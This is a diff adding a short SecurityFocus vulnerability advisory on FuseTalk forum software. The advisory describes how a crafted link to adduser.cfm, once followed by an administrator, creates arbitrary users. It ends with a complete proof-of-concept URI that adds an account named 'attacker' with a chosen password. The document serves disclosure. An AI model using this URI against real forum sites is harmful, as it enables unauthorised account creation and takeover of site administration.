@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/10276/info
+
+It has been reported that FuseTalk is affected by an administrator command execution vulnerability in the adduser.cfm script. This issue is due to a failure of the application to properly validate the origin of user supplied data.
+
+This issue could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were followed by a forum administrator, the attacker supplied command would be carried out with the viewer's privileges. This would occur in the security context of the affected web site and may allow creation of arbitrary users, and other attacks.
+
+http://www.example.com/admin/adduser.cfm?FTVAR_FIRSTNAMEFRM=God&FTVAR_LASTNAMEFRM=God&FTVAR_EMAILADDRESSFRM=Attacker@acker.com&FTVAR_USERNAMEFRM=attacker&FTVAR_PASSWORDFRM=coolpass&FTVAR_PASSWORD2FRM=coolpass&FTVAR_USERFORUMSFRM=0&FTVAR_USERTYPEFRM=g&FTVAR_USERLEVELFRM=0&FTVAR_STATUSFRM=1&FTVAR_CITYFRM=&FTVAR_STATEFRM=70&FTVAR_COUNTRYFRM=36&FTVAR_SCRIPTRUN=self.close%28%29%3B&FTVAR_RETURNERROR=Yes&FT_ACTION=adduser
